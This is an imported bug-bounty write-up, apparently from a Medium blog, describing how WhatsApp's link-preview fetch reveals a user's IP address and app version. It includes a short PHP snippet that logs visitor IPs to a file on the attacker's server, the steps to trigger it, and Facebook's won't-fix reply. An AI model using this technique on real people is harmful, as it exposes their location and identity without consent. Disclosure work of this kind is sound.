---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-18_whatsapp-users-ip-disclosure-with-link-preview-feature.md
original_filename: 2018-04-18_whatsapp-users-ip-disclosure-with-link-preview-feature.md
title: Whatsapp user’s IP disclosure with Link Preview feature
category: documents
detected_topics:
- command-injection
- information-disclosure
tags:
- imported
- documents
- command-injection
- information-disclosure
language: en
raw_sha256: 59a602a0d559f391af27155f2441f989a00bdd60fa822361c824567724df05ae
text_sha256: 05478a7f8920f657aaae42fe976d8ce8bf3f0848cf47d27d968724c6e3a61aff
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Whatsapp user’s IP disclosure with Link Preview feature

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-18_whatsapp-users-ip-disclosure-with-link-preview-feature.md
- Source Type: markdown
- Detected Topics: command-injection, information-disclosure
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `59a602a0d559f391af27155f2441f989a00bdd60fa822361c824567724df05ae`
- Text SHA256: `05478a7f8920f657aaae42fe976d8ce8bf3f0848cf47d27d968724c6e3a61aff`


## Content

---
title: "Whatsapp user’s IP disclosure with Link Preview feature"
url: "https://medium.com/@kankrale.rahul/whatsapp-users-ip-disclosure-with-link-preview-feature-39a477f54fba"
authors: ["Rahul Kankrale (@RahulKankrale)"]
programs: ["Meta / Facebook"]
bugs: ["Information disclosure"]
publication_date: "2018-04-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5909
scraped_via: "browseros"
---

# Whatsapp user’s IP disclosure with Link Preview feature

Top highlight

Whatsapp user’s IP disclosure with Link Preview feature
Rahul Kankrale
Follow
1 min read
·
Apr 18, 2018

497

10

Simple php code can disclose Whatsapp users ip and app version and save disclosed information to attackers server.

Step to reproduce:

Create php file and log file on server : Put below code for og meta description :

<meta property="og:description" content="<?php
echo $_SERVER[REMOTE_ADDR]; $line = date(’Y-m-d H:i:s’) . " - $_SERVER[REMOTE_ADDR]";echo $line;
file_put_contents(’visitors.log’, $line . PHP_EOL, FILE_APPEND);?>" />

2. Save this php file.

Get Rahul Kankrale’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

3. Open whatsapp and type this php files url in whatsapp, when link preview generated you can see IP get captured and same time this IP write over log file on attackers server.

WhatsApp Screenshot of Link Preview
Press enter or click to view image in full size
Server log for captured IP.
Press enter or click to view image in full size

Reported to Facebook

They replied that :

Not optimal the other alternative would be disabling previews (which probably would make more of our users unhappy).

So this will be Won’t fix., Thanks.
